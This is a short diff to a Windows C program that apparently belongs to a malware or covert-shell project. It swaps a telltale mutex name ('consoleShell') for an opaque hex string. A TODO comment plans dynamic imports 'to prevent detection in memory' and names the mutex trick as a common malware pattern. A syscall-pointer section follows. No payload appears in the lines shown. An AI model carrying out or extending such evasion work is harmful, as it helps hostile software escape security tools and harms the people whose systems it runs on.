@@ -98,8 +98,8 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev,
 
     /* ── 1. Single-instance guard ─────────────────────────────────────── */
     /* BUG 1: was CreateMutexA(NULL, NULL, L"consoleShell")               */
-    CreateMutexA(NULL, FALSE, "consoleShell");
-    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;
+    CreateMutexA(NULL, FALSE, "F373AE806A991FCC");
+    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0; //TODO: use dynamic imports to prevent detection in memory, CreateMutex is one of the common ways a malware doesnt run twice simultaneously
 
     /* ── 2. NT syscall pointers ──────────────────────────────────────── */
     /* BUG 3: return value was unchecked                                  */
